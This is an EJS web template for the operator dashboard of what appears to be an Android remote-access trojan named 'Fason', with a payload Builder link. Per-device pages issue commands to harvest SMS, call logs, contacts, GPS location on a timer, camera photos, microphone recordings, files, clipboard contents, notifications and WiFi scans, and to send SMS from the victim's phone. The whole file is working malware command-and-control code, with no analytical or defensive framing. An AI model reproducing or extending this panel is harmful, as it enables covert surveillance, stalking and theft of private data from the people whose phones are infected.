<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fason - <%= id %></title>
    <link rel="stylesheet" href="/css/style.css">
    <% if (page === 'gps') { %>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <% } %>
</head>
<body>
    <nav class="navbar">
        <a href="/" class="brand"><span class="fs-icon-sm">FS</span> Fason</a>
        <div class="nav-links">
            <a href="/">Dashboard</a>
            <a href="/builder">Builder</a>
            <a href="/logs">Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </nav>

    <main class="container device-page">
        <aside class="sidebar">
            <div class="device-id"><%= id %></div>
            <nav class="menu">
                <a href="/device/<%= id %>/info" class="<%= page === 'info' ? 'active' : '' %>"><span class="icon">📱</span> Info</a>
                <a href="/device/<%= id %>/sms" class="<%= page === 'sms' ? 'active' : '' %>"><span class="icon">💬</span> SMS</a>
                <a href="/device/<%= id %>/calls" class="<%= page === 'calls' ? 'active' : '' %>"><span class="icon">📞</span> Calls</a>
                <a href="/device/<%= id %>/contacts" class="<%= page === 'contacts' ? 'active' : '' %>"><span class="icon">👥</span> Contacts</a>
                <a href="/device/<%= id %>/gps" class="<%= page === 'gps' ? 'active' : '' %>"><span class="icon">📍</span> Location</a>
                <a href="/device/<%= id %>/camera" class="<%= page === 'camera' ? 'active' : '' %>"><span class="icon">📷</span> Camera</a>
                <a href="/device/<%= id %>/mic" class="<%= page === 'mic' ? 'active' : '' %>"><span class="icon">🎤</span> Mic</a>
                <a href="/device/<%= id %>/files" class="<%= page === 'files' ? 'active' : '' %>"><span class="icon">📁</span> Files</a>
                <a href="/device/<%= id %>/apps" class="<%= page === 'apps' ? 'active' : '' %>"><span class="icon">📦</span> Apps</a>
                <a href="/device/<%= id %>/clipboard" class="<%= page === 'clipboard' ? 'active' : '' %>"><span class="icon">📋</span> Clipboard</a>
                <a href="/device/<%= id %>/notifications" class="<%= page === 'notifications' ? 'active' : '' %>"><span class="icon">🔔</span> Notifications</a>
                <a href="/device/<%= id %>/wifi" class="<%= page === 'wifi' ? 'active' : '' %>"><span class="icon">📶</span> WiFi</a>
                <a href="/device/<%= id %>/permissions" class="<%= page === 'permissions' ? 'active' : '' %>"><span class="icon">🔐</span> Permissions</a>
                <a href="/device/<%= id %>/downloads" class="<%= page === 'downloads' ? 'active' : '' %>"><span class="icon">💾</span> Downloads</a>
            </nav>
        </aside>

        <section class="content">
            <% if (page === 'notfound') { %>
                <div class="card">
                    <h2>Device Not Found</h2>
                    <p class="empty">This device doesn't exist in the database.</p>
                    <a href="/" class="btn primary">← Back to Dashboard</a>
                </div>
            <% } else if (page === 'info') { %>
                <% const c = data.client; %>
                <div class="card">
                    <h2>Device Information</h2>
                    <div class="info-grid">
                        <div class="info-item"><label>Device ID</label><code><%= c.id %></code></div>
                        <div class="info-item"><label>Status</label><span class="badge <%= c.online ? 'success' : 'error' %>"><%= c.online ? 'Online' : 'Offline' %></span></div>
                        <div class="info-item"><label>Brand</label><span><%= c.device?.brand || '—' %></span></div>
                        <div class="info-item"><label>Model</label><span><%= c.device?.model || '—' %></span></div>
                        <div class="info-item"><label>Android</label><span><%= c.device?.version || '—' %></span></div>
                        <div class="info-item"><label>IP</label><code><%= c.ip || '—' %></code></div>
                        <div class="info-item"><label>Country</label><span><%= c.country || '—' %></span></div>
                        <div class="info-item"><label>First Seen</label><span><%= new Date(c.firstSeen).toLocaleString() %></span></div>
                        <div class="info-item"><label>Last Seen</label><span><%= new Date(c.lastSeen).toLocaleString() %></span></div>
                    </div>
                </div>
                <div class="card">
                    <div class="card-header"><h2>Quick Actions</h2></div>
                    <div class="btn-group">
                        <button class="btn" onclick="sendCmd('0xLO')">📍 Location</button>
                        <button class="btn" onclick="sendCmd('0xPM')">🔐 Permissions</button>
                        <button class="btn" onclick="sendCmd('0xIN', {includeSystem: false})">📦 Apps</button>
                        <button class="btn" onclick="sendCmd('0xCO')">👥 Contacts</button>
                        <button class="btn" onclick="sendCmd('0xCL')">📞 Calls</button>
                        <button class="btn" onclick="sendCmd('0xSM', {action: 'ls'})">💬 SMS</button>
                    </div>
                </div>
            <% } else if (page === 'sms') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>💬 SMS Messages</h2>
                        <button class="btn primary" onclick="sendCmd('0xSM', {action: 'ls'})">🔄 Refresh</button>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No SMS messages. Click Refresh to load.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> messages</p>
                    <div class="table-wrap">
                        <table>
                            <thead><tr><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
                            <tbody>
                                <% data.list.slice(0, 100).forEach(sms => { %>
                                <tr>
                                    <td><code><%= sms.address %></code></td>
                                    <td class="wrap"><%= sms.body %></td>
                                    <td><%= new Date(parseInt(sms.date)).toLocaleString() %></td>
                                    <td><span class="badge <%= sms.type == 1 ? 'info' : 'success' %>"><%= sms.type == 1 ? 'Inbox' : 'Sent' %></span></td>
                                </tr>
                                <% }) %>
                            </tbody>
                        </table>
                    </div>
                    <% } %>
                </div>
                <div class="card">
                    <h2>📤 Send SMS</h2>
                    <p class="hint">Send SMS from the device.</p>
                    <form onsubmit="sendSmsHandler(event)" style="margin-top: 1rem;">
                        <div class="form-row">
                            <input type="tel" id="sms-to" placeholder="Phone number" required style="flex: 1;">
                        </div>
                        <div class="form-row" style="margin-top: 0.5rem;">
                            <input type="text" id="sms-msg" placeholder="Message" required style="flex: 2;">
                            <button type="submit" class="btn primary">Send</button>
                        </div>
                    </form>
                </div>
            <% } else if (page === 'calls') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>Call Logs</h2>
                        <button class="btn" onclick="sendCmd('0xCL')">Refresh</button>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No call logs.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> calls</p>
                    <div class="table-wrap">
                        <table>
                            <thead><tr><th>Name</th><th>Number</th><th>Duration</th><th>Date</th><th>Type</th></tr></thead>
                            <tbody>
                                <% data.list.slice(0, 100).forEach(call => { 
                                    const types = {1: 'Incoming', 2: 'Outgoing', 3: 'Missed'};
                                    const badges = {1: 'success', 2: 'info', 3: 'error'};
                                %>
                                <tr>
                                    <td><%= call.name || '—' %></td>
                                    <td><code><%= call.phoneNo %></code></td>
                                    <td><%= Math.floor(call.duration / 60) %>m <%= call.duration % 60 %>s</td>
                                    <td><%= new Date(parseInt(call.date)).toLocaleString() %></td>
                                    <td><span class="badge <%= badges[call.type] || '' %>"><%= types[call.type] || '?' %></span></td>
                                </tr>
                                <% }) %>
                            </tbody>
                        </table>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'contacts') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>Contacts</h2>
                        <button class="btn" onclick="sendCmd('0xCO')">Refresh</button>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No contacts.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> contacts</p>
                    <div class="table-wrap">
                        <table>
                            <thead><tr><th>Name</th><th>Phone</th></tr></thead>
                            <tbody>
                                <% data.list.forEach(c => { %>
                                <tr><td><strong><%= c.name %></strong></td><td><code><%= c.phoneNo %></code></td></tr>
                                <% }) %>
                            </tbody>
                        </table>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'gps') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>📍 Location</h2>
                        <div class="btn-group">
                            <button class="btn primary" onclick="sendCmd('0xLO')">📍 Get Now</button>
                            <select id="gps-interval" onchange="setGpsInterval(this.value)">
                                <option value="0" <%= data.interval == 0 ? 'selected' : '' %>>Off</option>
                                <option value="10" <%= data.interval == 10 ? 'selected' : '' %>>10s</option>
                                <option value="30" <%= data.interval == 30 ? 'selected' : '' %>>30s</option>
                                <option value="60" <%= data.interval == 60 ? 'selected' : '' %>>1m</option>
                                <option value="300" <%= data.interval == 300 ? 'selected' : '' %>>5m</option>
                                <option value="600" <%= data.interval == 600 ? 'selected' : '' %>>10m</option>
                            </select>
                        </div>
                    </div>
                    <div id="map" style="height: 400px; border-radius: 8px; background: var(--card-alt); margin-top: 1rem;"></div>
                </div>
                <div class="card">
                    <div class="card-header">
                        <h2>📋 History</h2>
                        <% if (data.list && data.list.length > 0) { %>
                        <span class="hint"><%= data.list.length %> points</span>
                        <% } %>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No location data.</p>
                    <% } else { %>
                    <div class="table-wrap">
                        <table>
                            <thead><tr><th>#</th><th>Lat</th><th>Lng</th><th>Acc</th><th>Time</th><th></th></tr></thead>
                            <tbody>
                                <% data.list.slice(-30).reverse().forEach((loc, i) => { %>
                                <tr>
                                    <td><%= i + 1 %></td>
                                    <td><code><%= loc.latitude?.toFixed(6) %></code></td>
                                    <td><code><%= loc.longitude?.toFixed(6) %></code></td>
                                    <td><%= loc.accuracy ? loc.accuracy.toFixed(0) + 'm' : '—' %></td>
                                    <td><%= new Date(loc.time).toLocaleString() %></td>
                                    <td><button class="btn small" onclick="centerMap(<%= loc.latitude %>, <%= loc.longitude %>)">View</button></td>
                                </tr>
                                <% }) %>
                            </tbody>
                        </table>
                    </div>
                    <% } %>
                </div>
                <script>
                document.addEventListener('DOMContentLoaded', function() {
                    initMap(<%- JSON.stringify(data.list || []) %>);
                });
                </script>
            <% } else if (page === 'camera') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>📷 Camera</h2>
                        <button class="btn primary" onclick="sendCmd('0xCA', {action: 'list'})">🔍 Detect</button>
                    </div>
                    <div class="camera-grid">
                        <% if (data.cameras && data.cameras.length > 0) { %>
                            <% data.cameras.forEach(cam => { %>
                            <button class="btn" onclick="sendCmd('0xCA', {action: 'capture', id: <%= cam.id %>})">📷 <%= cam.name || 'Cam ' + cam.id %></button>
                            <% }) %>
                        <% } else { %>
                        <p class="empty">No cameras. Click Detect.</p>
                        <% } %>
                    </div>
                </div>
                <div class="card">
                    <div class="card-header">
                        <h2>📸 Photos</h2>
                        <% if (data.photos && data.photos.length > 0) { %>
                        <span class="hint"><%= data.photos.length %> photos</span>
                        <% } %>
                    </div>
                    <% if (!data.photos || data.photos.length === 0) { %>
                    <p class="empty">No photos.</p>
                    <% } else { %>
                    <div class="photo-grid">
                        <% data.photos.slice().reverse().forEach(p => { %>
                        <div class="photo-item">
                            <a href="<%= p.file %>" target="_blank"><img src="<%= p.file %>" loading="lazy"></a>
                            <span class="photo-time"><%= new Date(p.time).toLocaleString() %></span>
                        </div>
                        <% }) %>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'mic') { %>
                <div class="card">
                    <h2>🎤 Mic Recording</h2>
                    <p class="hint">Record audio from device.</p>
                    <div class="form-row" style="margin-top: 1rem;">
                        <select id="mic-duration">
                            <option value="10">10s</option>
                            <option value="30">30s</option>
                            <option value="60" selected>1m</option>
                            <option value="120">2m</option>
                            <option value="300">5m</option>
                            <option value="600">10m</option>
                        </select>
                        <button class="btn primary" id="recordBtn" onclick="recordMic()">🎤 Record</button>
                    </div>
                    <div id="recording-status" class="hidden recording-status">
                        <div class="status-row">
                            <span class="status-dot online" style="animation: pulse 1s infinite;"></span>
                            <span id="status-text">Recording...</span>
                        </div>
                        <div class="progress-bar" style="margin-top: 0.5rem;">
                            <div class="progress-fill" id="record-progress" style="width: 0%; background: var(--error);"></div>
                        </div>
                    </div>
                </div>
            <% } else if (page === 'files') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>📁 Files</h2>
                        <div class="btn-group">
                            <button class="btn primary" onclick="browseFiles('')">🏠 Root</button>
                            <button class="btn" onclick="browseFiles('/sdcard')">📱 SD</button>
                            <button class="btn" onclick="browseFiles('/storage')">💾 Storage</button>
                        </div>
                    </div>
                    <% if (data.path) { %>
                    <div class="path-bar"><span style="color: var(--muted);">Path:</span><code style="flex:1"><%= data.path %></code></div>
                    <% } %>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No files.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> items</p>
                    <div class="file-list">
                        <% data.list.forEach(f => { %>
                        <div class="file-item" onclick="<%= f.isDir ? `browseFiles('${f.path}')` : `requestFileDownload('${f.path}')` %>">
                            <span class="file-icon"><%= f.isDir ? '📁' : '📄' %></span>
                            <div style="flex:1"><div class="file-name"><%= f.name %></div></div>
                            <% if (!f.isDir) { %>
                            <button class="btn small" onclick="event.stopPropagation(); requestFileDownload('<%= f.path %>')">⬇</button>
                            <% } else { %>
                            <span class="hint">→</span>
                            <% } %>
                        </div>
                        <% }) %>
                    </div>
                    <% } %>
                </div>
                <div id="download-status" class="card hidden">
                    <h2>⬇ Progress</h2>
                    <div id="download-list"></div>
                </div>
            <% } else if (page === 'apps') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>Apps</h2>
                        <div class="btn-group">
                            <button class="btn primary" onclick="sendCmd('0xIN', {includeSystem: false})">User</button>
                            <button class="btn" onclick="sendCmd('0xIN', {includeSystem: true})">All</button>
                        </div>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No apps.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> apps</p>
                    <div class="app-grid">
                        <% data.list.forEach(app => { %>
                        <div class="app-item">
                            <div class="app-name"><%= app.appName %></div>
                            <div class="app-pkg"><code><%= app.packageName %></code></div>
                            <div class="app-version">v<%= app.versionName %> <% if (app.isSystem) { %><span class="badge">Sys</span><% } %></div>
                        </div>
                        <% }) %>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'clipboard') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>Clipboard</h2>
                        <div class="btn-group">
                            <button class="btn" onclick="sendCmd('0xCB', {action: 'fetch'})">Fetch</button>
                            <button class="btn" onclick="sendCmd('0xCB', {action: 'start'})">Monitor</button>
                        </div>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No data.</p>
                    <% } else { %>
                    <div class="clipboard-list">
                        <% data.list.slice().reverse().slice(0, 30).forEach(c => { %>
                        <div class="clipboard-item">
                            <div class="clipboard-text"><%= c.text %></div>
                            <div class="clipboard-time"><%= new Date(c.time).toLocaleString() %></div>
                        </div>
                        <% }) %>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'notifications') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>🔔 Notifications</h2>
                        <button class="btn" onclick="sendCmd('0xNO', {})">🔄</button>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No notifications.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> items</p>
                    <div class="notif-list">
                        <% data.list.slice().reverse().slice(0, 50).forEach(n => { %>
                        <div class="notif-item">
                            <div class="notif-header">
                                <span class="notif-app"><%= n.appName %></span>
                                <span class="notif-time"><%= new Date(n.time).toLocaleString() %></span>
                            </div>
                            <% if (n.title) { %><div class="notif-title"><%= n.title %></div><% } %>
                            <% if (n.content) { %><div class="notif-content"><%= n.content %></div><% } %>
                        </div>
                        <% }) %>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'wifi') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>📶 WiFi</h2>
                        <button class="btn primary" onclick="sendCmd('0xWI', {})">🔄 Scan</button>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No networks.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> networks</p>
                    <div class="table-wrap">
                        <table>
                            <thead><tr><th>SSID</th><th>BSSID</th><th>Signal</th><th>Freq</th></tr></thead>
                            <tbody>
                                <% data.list.forEach(w => { %>
                                <tr>
                                    <td><strong><%= w.SSID || '(Hidden)' %></strong></td>
                                    <td><code><%= w.BSSID %></code></td>
                                    <td>
                                        <div class="signal-bar"><div class="signal-level" style="width: <%= Math.min(100, Math.max(0, (w.level + 100) * 2)) %>%"></div></div>
                                        <span><%= w.level %> dBm</span>
                                    </td>
                                    <td><%= w.frequency %> MHz</td>
                                </tr>
                                <% }) %>
                            </tbody>
                        </table>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'permissions') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>Permissions</h2>
                        <button class="btn" onclick="sendCmd('0xPM')">Refresh</button>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No permissions.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> granted</p>
                    <div class="perm-grid">
                        <% data.list.forEach(p => { const name = p.split('.').pop(); %>
                        <div class="perm-item"><span class="perm-icon">✓</span><span><%= name %></span></div>
                        <% }) %>
                    </div>
                    <% } %>
                </div>
            <% } else if (page === 'downloads') { %>
                <div class="card">
                    <div class="card-header">
                        <h2>💾 Downloads</h2>
                        <button class="btn" onclick="location.reload()">🔄</button>
                    </div>
                    <% if (!data.list || data.list.length === 0) { %>
                    <p class="empty">No files.</p>
                    <% } else { %>
                    <p class="hint"><%= data.list.length %> files</p>
                    <div class="table-wrap">
                        <table>
                            <thead><tr><th>Name</th><th>Time</th><th></th></tr></thead>
                            <tbody>
                                <% data.list.slice().reverse().forEach(d => { %>
                                <tr>
                                    <td><%= d.name %></td>
                                    <td><%= new Date(d.time).toLocaleString() %></td>
                                    <td><a href="<%= d.file %>" class="btn small" download>⬇</a></td>
                                </tr>
                                <% }) %>
                            </tbody>
                        </table>
                    </div>
                    <% } %>
                </div>
            <% } else { %>
                <div class="card">
                    <h2>Not Found</h2>
                    <p class="empty">Page not found.</p>
                    <a href="/device/<%= id %>/info" class="btn primary">← Info</a>
                </div>
            <% } %>
        </section>
    </main>

    <div id="toast" class="toast"></div>
    <script>const DEVICE_ID = '<%= id %>';</script>
    <% if (page === 'gps') { %>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <% } %>
    <script src="/js/app.js"></script>
</body>
</html>
